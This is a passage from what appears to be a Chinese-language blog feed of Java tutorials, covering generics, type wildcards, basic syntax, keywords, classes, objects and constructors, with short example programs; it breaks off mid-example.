class="string">&quot;pear&quot;</span>,</span><br><span class="line">         <span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, maximum( <span class="string">&quot;pear&quot;</span>, <span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span> ) );</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191151480.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191151488.png"></p><h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><p>泛型类的声明和非泛型类的声明类似，除了在类名后面添加了类型参数声明部分。</p><p>和泛型方法一样，泛型类的类型参数声明部分也包含一个或多个类型参数，参数间用逗号隔开。一个泛型参数，也被称为一个类型变量，是用于指定一个泛型类型名称的标识符。因为他们接受一个或多个参数，这些类被称为参数化的类或参数化的类型。</p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T t;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(T t)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.t = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Test&lt;Integer&gt; integerTest = <span class="keyword">new</span> Test&lt;Integer&gt;();</span><br><span class="line">        Test&lt;String&gt; stringTest = <span class="keyword">new</span> Test&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        integerTest.add(<span class="keyword">new</span> Integer(<span class="number">10</span>));</span><br><span class="line">        stringTest.add(<span class="keyword">new</span> String(<span class="string">&quot;sigma&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.printf(<span class="string">&quot;整型值为 :%d\n\n&quot;</span>, integerTest.get());</span><br><span class="line">        System.out.printf(<span class="string">&quot;字符串为 :%s\n&quot;</span>, stringTest.get());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191204909.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191205730.png"></p><h2 id="类型通配符"><a href="#类型通配符" class="headerlink" title="类型通配符"></a>类型通配符</h2><p>1、类型通配符一般是使用 <strong>?</strong> 代替具体的类型参数。例如 <strong>List&lt;?&gt;</strong> 在逻辑上是 **<code>List&lt;String&gt;</code>,<code>List&lt;Integer&gt;</code> 等所有 **<code>List&lt;具体类型实参&gt;</code>的父类。</p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ArrayList 类是一个可以动态修改的数组，与普通数组的区别就是它是没有固定大小的限制，我们可以添加或删除元素。</span></span><br><span class="line">        List&lt;String&gt; name = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        List&lt;Integer&gt; age = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        List&lt;Number&gt; number = <span class="keyword">new</span> ArrayList&lt;Number&gt;();</span><br><span class="line"></span><br><span class="line">        name.add(<span class="string">&quot;sigma&quot;</span>);</span><br><span class="line">        age.add(<span class="number">42</span>);</span><br><span class="line">        number.add(<span class="number">768</span>);</span><br><span class="line"></span><br><span class="line">        getData(name);</span><br><span class="line">        getData(age);</span><br><span class="line">        getData(number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getData</span><span class="params">(List&lt;?&gt; data)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;data:&quot;</span> + data.get(<span class="number">0</span>));<span class="comment">//get(0)是获取集合中的第一个元素         </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191227064.png"></p><p><strong>解析：</strong></p><p> 因为 <strong>getData()</strong> 方法的参数是 <strong>List&lt;?&gt;</strong> 类型的，所以 <strong>name，age，number</strong> 都可以作为这个方法的实参，这就是通配符的作用。</p><p>编译运行结果如下：<br><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191228734.png"></p><p>2、类型通配符上限通过形如List来定义，如此定义就是通配符泛型值接受Number及其下层子类类型。</p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; name = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        List&lt;Integer&gt; age = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        List&lt;Number&gt; number = <span class="keyword">new</span> ArrayList&lt;Number&gt;();</span><br><span class="line">        </span><br><span class="line">        name.add(<span class="string">&quot;sigma&quot;</span>);</span><br><span class="line">        age.add(<span class="number">42</span>);</span><br><span class="line">        number.add(<span class="number">768</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//getUperNumber(name);//1</span></span><br><span class="line">        getUperNumber(age);<span class="comment">//2</span></span><br><span class="line">        getUperNumber(number);<span class="comment">//3</span></span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getData</span><span class="params">(List&lt;?&gt; data)</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;data :&quot;</span> + data.get(<span class="number">0</span>));</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getUperNumber</span><span class="params">(List&lt;? extends Number&gt; data)</span> </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;data :&quot;</span> + data.get(<span class="number">0</span>));</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191237115.png"></p><p><strong>解析：</strong> 在 <strong>//1</strong> 处会出现错误，因为 <strong>getUperNumber()</strong> 方法中的参数已经限定了参数泛型上限为 <strong>Number</strong>，所以泛型为 <strong>String</strong> 是不在这个范围之内，所以会报错。</p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191237040.png"></p><p>3、类型通配符下限通过形如 <strong>List&lt;? super Number&gt;</strong> 来定义，表示类型只能接受 <strong>Number</strong> 及其上层父类类型，如 <strong>Object</strong> 类型的实例。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础</title>
      <link href="/2023/05/07/Java/"/>
      <url>/2023/05/07/Java/</url>
      
        <content type="html"><![CDATA[<h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="第一个Hello-World程序"><a href="#第一个Hello-World程序" class="headerlink" title="第一个Hello World程序"></a>第一个Hello World程序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230507011854.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230507011654.png"></p><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230507012235.png"></p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>编写 Java 程序时，应注意以下几点：</p><ul><li><strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li><li><strong>类名</strong>：对于所有的类来说，<strong>类名的首字母应该大写</strong>。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li><li><strong>方法名</strong>：<strong>所有的方法名都应该以小写字母开头</strong>。如果方法名含有若干单词，则后面的每个单词首字母大写，例如main。</li><li><strong>源文件名</strong>：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li><li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li></ul><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>Java 所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符。</p><p>关于 Java 标识符，有以下几点需要注意：</p><ul><li>所有的标识符都应该以字母（A-Z 或者 a-z）,美元符（$）、或者下划线（_）开始</li><li>首字符之后可以是字母（A-Z 或者 a-z）,美元符（$）、下划线（_）或数字的任何字符组合</li><li>关键字不能用作标识符</li><li>标识符是大小写敏感的</li><li>合法标识符举例：age、$salary、_value、__1_value</li><li>非法标识符举例：123abc、-salary</li></ul><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>下面列出了 Java 关键字。这些保留字不能用于常量、变量、和任何标识符的名称。</p><table><thead><tr><th align="left">类别</th><th align="left">关键字</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">访问控制</td><td align="left">private</td><td align="left">私有的</td></tr><tr><td align="left">protected</td><td align="left">受保护的</td><td align="left"></td></tr><tr><td align="left">public</td><td align="left">公共的</td><td align="left"></td></tr><tr><td align="left">default</td><td align="left">默认</td><td align="left"></td></tr><tr><td align="left">类、方法和变量修饰符</td><td align="left">abstract</td><td align="left">声明抽象</td></tr><tr><td align="left">class</td><td align="left">类</td><td align="left"></td></tr><tr><td align="left">extends</td><td align="left">扩充,继承</td><td align="left"></td></tr><tr><td align="left">final</td><td align="left">最终值,不可改变的</td><td align="left"></td></tr><tr><td align="left">implements</td><td align="left">实现（接口）</td><td align="left"></td></tr><tr><td align="left">interface</td><td align="left">接口</td><td align="left"></td></tr><tr><td align="left">native</td><td align="left">本地，原生方法（非 Java 实现）</td><td align="left"></td></tr><tr><td align="left">new</td><td align="left">新,创建</td><td align="left"></td></tr><tr><td align="left">static</td><td align="left">静态</td><td align="left"></td></tr><tr><td align="left">strictfp</td><td align="left">严格,精准</td><td align="left"></td></tr><tr><td align="left">synchronized</td><td align="left">线程,同步</td><td align="left"></td></tr><tr><td align="left">transient</td><td align="left">短暂</td><td align="left"></td></tr><tr><td align="left">volatile</td><td align="left">易失</td><td align="left"></td></tr><tr><td align="left">程序控制语句</td><td align="left">break</td><td align="left">跳出循环</td></tr><tr><td align="left">case</td><td align="left">定义一个值以供 switch 选择</td><td align="left"></td></tr><tr><td align="left">continue</td><td align="left">继续</td><td align="left"></td></tr><tr><td align="left">do</td><td align="left">运行</td><td align="left"></td></tr><tr><td align="left">else</td><td align="left">否则</td><td align="left"></td></tr><tr><td align="left">for</td><td align="left">循环</td><td align="left"></td></tr><tr><td align="left">if</td><td align="left">如果</td><td align="left"></td></tr><tr><td align="left">instanceof</td><td align="left">实例</td><td align="left"></td></tr><tr><td align="left">return</td><td align="left">返回</td><td align="left"></td></tr><tr><td align="left">switch</td><td align="left">根据值选择执行</td><td align="left"></td></tr><tr><td align="left">while</td><td align="left">循环</td><td align="left"></td></tr><tr><td align="left">错误处理</td><td align="left">assert</td><td align="left">断言表达式是否为真</td></tr><tr><td align="left">catch</td><td align="left">捕捉异常</td><td align="left"></td></tr><tr><td align="left">finally</td><td align="left">有没有异常都执行</td><td align="left"></td></tr><tr><td align="left">throw</td><td align="left">抛出一个异常对象</td><td align="left"></td></tr><tr><td align="left">throws</td><td align="left">声明一个异常可能被抛出</td><td align="left"></td></tr><tr><td align="left">try</td><td align="left">捕获异常</td><td align="left"></td></tr><tr><td align="left">包相关</td><td align="left">import</td><td align="left">引入</td></tr><tr><td align="left">package</td><td align="left">包</td><td align="left"></td></tr><tr><td align="left">基本类型</td><td align="left">boolean</td><td align="left">布尔型</td></tr><tr><td align="left">byte</td><td align="left">字节型</td><td align="left"></td></tr><tr><td align="left">char</td><td align="left">字符型</td><td align="left"></td></tr><tr><td align="left">double</td><td align="left">双精度浮点</td><td align="left"></td></tr><tr><td align="left">float</td><td align="left">单精度浮点</td><td align="left"></td></tr><tr><td align="left">int</td><td align="left">整型</td><td align="left"></td></tr><tr><td align="left">long</td><td align="left">长整型</td><td align="left"></td></tr><tr><td align="left">short</td><td align="left">短整型</td><td align="left"></td></tr><tr><td align="left">变量引用</td><td align="left">super</td><td align="left">父类,超类</td></tr><tr><td align="left">this</td><td align="left">本类</td><td align="left"></td></tr><tr><td align="left">void</td><td align="left">无返回值</td><td align="left"></td></tr><tr><td align="left">保留关键字</td><td align="left">goto</td><td align="left">是关键字，但不能使用</td></tr><tr><td align="left">const</td><td align="left">是关键字，但不能使用</td><td align="left"></td></tr></tbody></table><p><strong>注意：</strong>Java 的 null 不是关键字，类似于 true 和 false，它是一个字面常量，不允许作为标识符使用。</p><h2 id="Java修饰符"><a href="#Java修饰符" class="headerlink" title="Java修饰符"></a>Java修饰符</h2><p>像其他语言一样，Java可以使用修饰符来修饰类中方法和属性。主要有两类修饰符：</p><ul><li>访问控制修饰符 : default, public , protected, private</li><li>非访问控制修饰符 : final, abstract, static, synchronized</li></ul><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>单行可以用 <code>//</code>、<code>/*</code>与<code>*/</code></p><p>多行用<code>/*</code>与<code>*/</code>，中间行用<code>*</code>开头</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">   <span class="comment">/* 这是第一个Java程序</span></span><br><span class="line"><span class="comment">    * 它将输出 Hello World</span></span><br><span class="line"><span class="comment">    * 这是一个多行注释的示例</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">       <span class="comment">// 这是单行注释的示例</span></span><br><span class="line">       <span class="comment">/* 这个也是单行注释的示例 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;Hello World&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="源程序与编译型运行区别"><a href="#源程序与编译型运行区别" class="headerlink" title="源程序与编译型运行区别"></a>源程序与编译型运行区别</h2><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230507014501.png"></p><h1 id="对象和类"><a href="#对象和类" class="headerlink" title="对象和类"></a>对象和类</h1><ul><li><strong>对象</strong>：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</li><li><strong>类</strong>：类是一个模板，它描述一类对象的行为和状态。</li></ul><p>下图中<strong>汽车</strong>为<strong>类（class）</strong>，而具体的每辆车为该<strong>汽车</strong>类的<strong>对象（object）</strong>，对象包含了汽车的颜色、品牌、名称等。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230507182831.png"></p><p>类(class)可以看成是创建 Java 对象(object)的模板。</p><p>将下图用java代码表示</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230507183257.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span>&#123;</span><br><span class="line">    String breed;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    String color;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">name</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个类可以拥有多个方法，在上面的例子中：eat()、run()、sleep() 和 name() 都是 Dog 类的方法。</p><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>每个类都有构造方法。如果没有显式地为类定义构造方法，Java 编译器将会为该类提供一个默认构造方法。</p><p>在创建一个对象的时候，至少要调用一个构造方法。<strong>构造方法的名称必须与类同名</strong>，一个类可以有多个构造方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Puppy</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Puppy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//这是一个构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Puppy</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="comment">//这是另一个构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>对象是根据类创建的。在Java中，使用关键字 new 来创建一个新的对象。创建对象需要以下三步：</p><ul><li><p><strong>声明</strong>：声明一个对象，包括对象名称和对象类型。</p></li><li><p><strong>实例化</strong>：使用关键字 new 来创建一个对象。</p></li><li><p><strong>初始化</strong>：使用 new 创建对象时，会调用构造方法初始化对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Puppy</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Puppy</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小狗的名字是：&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Puppy myPuppy = <span class="keyword">new</span> Puppy(<span class="string">&quot;tommy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>编译并运行上面的程序，会打印出下面的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508012722.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508012921.png"></p><h2 id="访问实例变量和方法"><a href="#访问实例变量和方法" class="headerlink" title="访问实例变量和方法"></a>访问实例变量和方法</h2><p>通过已创建的对象来访问成员变量和成员方法，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*实例化对象*/</span></span><br><span class="line">Object referenceVariable = <span class="keyword">new</span> Constructor();</span><br><span class="line"><span class="comment">/*访问类中的变量*/</span></span><br><span class="line">referenceVariable.variableName;</span><br><span class="line"><span class="comment">/*访问类中的方法*/</span></span><br><span class="line">referenceVariable.methodName();</span><br></pre></td></tr></table></figure><h2 id="实例A"><a href="#实例A" class="headerlink" title="实例A"></a>实例A</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Neko</span></span>&#123;                                            <span class="comment">//类名首字母大写</span></span><br><span class="line">    <span class="keyword">int</span> NekoAge;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Neko</span><span class="params">(String name)</span></span>&#123;                                 <span class="comment">//构造方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;小猫的名字是：&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;                              <span class="comment">//方法名首字母小写</span></span><br><span class="line">        NekoAge = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;                                      <span class="comment">//方法名首字母小写</span></span><br><span class="line">        System.out.println(<span class="string">&quot;小猫的名字是：&quot;</span> + NekoAge);</span><br><span class="line">        <span class="keyword">return</span> NekoAge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Neko myNeko = <span class="keyword">new</span> Neko(<span class="string">&quot;neko&quot;</span>);              <span class="comment">// 对象名称：myNeko，类型：Neko。使用关键字new创建对象myNeko，调用构造方法Neko来初始化对象</span></span><br><span class="line">        myNeko.setAge(<span class="number">3</span>);                             <span class="comment">//调用setAge方法设置小猫的年龄</span></span><br><span class="line">        myNeko.getAge();                                  <span class="comment">//调用getAge方法输出NekoAge</span></span><br><span class="line">        System.out.println(myNeko.NekoAge);               <span class="comment">//直接输出myNeko对象的NekoAge属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508160016.png"></p><p>运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508155510.png"></p><h2 id="源文件声明规则"><a href="#源文件声明规则" class="headerlink" title="源文件声明规则"></a>源文件声明规则</h2><p>当在一个源文件中定义多个类，并且还有<strong>import</strong>语句和<strong>package</strong>语句时，要特别注意这些规则。</p><ul><li>一个源文件中只能有一个 public 类，可以有多个非 public 类</li><li>源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee，那么源文件应该命名为Employee.java。</li><li>如果一个类定义在某个包中，那么 package 语句应该在源文件的首行。</li><li>如果源文件包含 import 语句，那么应该放在 package 语句和类定义之间。如果没有 package 语句，那么 import 语句应该在源文件中最前面。</li><li>import 语句和 package 语句对源文件中定义的所有类都有效。在同一源文件中，不能给不同的类不同的包声明。</li></ul><p>类有若干种访问级别，并且类也分不同的类型：抽象类和 final 类等。这些将在访问控制章节介绍。</p><p>除了上面提到的几种类型，Java 还有一些特殊的类，如：内部类、匿名类。</p><h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><p>包主要用来对<strong>类</strong>和<strong>接口</strong>进行分类。当开发 Java 程序时，可能编写成百上千的类，因此很有必要对类和接口进行分类。</p><h2 id="import语句"><a href="#import语句" class="headerlink" title="import语句"></a>import语句</h2><p>在 Java 中，如果给出一个完整的限定名，包括包名、类名，那么 Java 编译器就可以很容易地定位到源代码或者类。import 语句就是用来提供一个合理的路径，使得编译器可以找到某个类。</p><p>例如，下面的命令行将会命令编译器载入 java_installation/java/io 路径下的所有类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br></pre></td></tr></table></figure><h2 id="实例B"><a href="#实例B" class="headerlink" title="实例B"></a>实例B</h2><p><em><strong>Employee.java</strong></em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> 